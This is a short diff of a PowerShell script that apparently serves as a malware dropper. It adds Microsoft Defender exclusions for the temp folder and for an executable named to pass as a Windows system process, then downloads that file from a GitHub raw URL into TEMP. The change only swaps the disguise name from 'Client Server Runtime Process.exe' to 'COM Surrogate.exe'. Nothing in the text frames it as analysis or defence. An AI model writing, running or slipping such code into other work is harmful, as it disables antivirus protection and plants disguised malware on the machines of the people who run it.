@@ -1,10 +1,10 @@
 Add-MpPreference -ExclusionPath "$env:temp"
-Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\Client Server Runtime Process.exe"
-Add-MpPreference -ExclusionPath "$env:TEMP\Client Server Runtime Process.exe"
-Add-MpPreference -ExclusionProcess "Client Server Runtime Process.exe"
+Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM Surrogate.exe"
+Add-MpPreference -ExclusionPath $env:TEMP\COM Surrogate.exe
+Add-MpPreference -ExclusionProcess "COM Surrogate.exe"
 $url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
 
- $output = "$env:TEMP\Client Server Runtime Process.exe"
+ $output = "$env:TEMP\COM Surrogate.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $output
 
